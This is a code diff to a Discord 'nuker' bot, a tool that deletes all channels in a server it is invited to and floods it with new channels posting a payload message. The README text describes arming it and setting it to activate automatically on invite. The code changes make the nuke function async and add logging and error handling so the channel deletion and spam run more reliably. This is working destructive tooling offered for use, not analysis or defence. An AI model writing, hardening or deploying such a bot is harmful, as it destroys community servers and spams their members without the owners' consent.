@@ -52,7 +52,7 @@ When done, click on "JSON Data Editor" and copy the JSON into message.json, over
 
 Other configurations can be found in config.json
 To use the bot, "armed" has to be seet to true
-If you want to activite the bot immediately after it was invited, set "automaticActivation" to true. This might be dangerous. 
+If you want to activite the bot immediately after it was invited, set "automaticActivation" to true. This might be dangerous.
 ==============================================================
 AUTHORIZATION | AKA HOW TO SUPPLY TOKEN
 ==============================================================
@@ -84,7 +84,7 @@ client.login(token);
 client.once(Events.ClientReady, readyClient => { console.log(`Logged in as ${readyClient.user.tag}`); });
 
 //Nuke function
-function nuke(guild)
+async function nuke(guild)
 {
 
     //Return if the nuker is not armed
@@ -102,7 +102,12 @@ function nuke(guild)
         //Iterate through the channels of the server and delete them
         for (let [id,channel] of channelManager.cache) {
             //Making sure the script doesn't remove the channels the nuker created
-            if(channel.name != channelName) channel.delete();
+            if(channel.name != channelName) {
+                console.log(`Attempting to delete #${channel.name}...`)
+                channel.delete().catch(err => {
+                    console.log(`Failed to delete #${channel.name} due to this error: ${err}`)
+                });
+            }
         }
     }
 
@@ -118,9 +123,14 @@ function nuke(guild)
             channelManager.create({
                 name: channelName,
                 type: ChannelType.GuildText,
-            }).then(channel => {
+            })
+            .then(channel => {
                 //Send the payload message
-                channel.send(payloadMessage)
+                channel.send(payloadMessage).catch(err => {
+                    console.log(`Couldn't send message to #${channel.name} due to this error: ${err}`)
+                })
+            }).catch(err => {
+                console.log(`Failed to create a channel due to this error: ${err}`)
             })
         }
     }
@@ -141,7 +151,7 @@ client.on(Events.MessageCreate, message => {
     //Display payload message
     if(message.content == "!message")
     {
-        message.reply(payloadMessage)
+        message.reply(payloadMessage).catch(err => {})
     }
 
     //Nuke
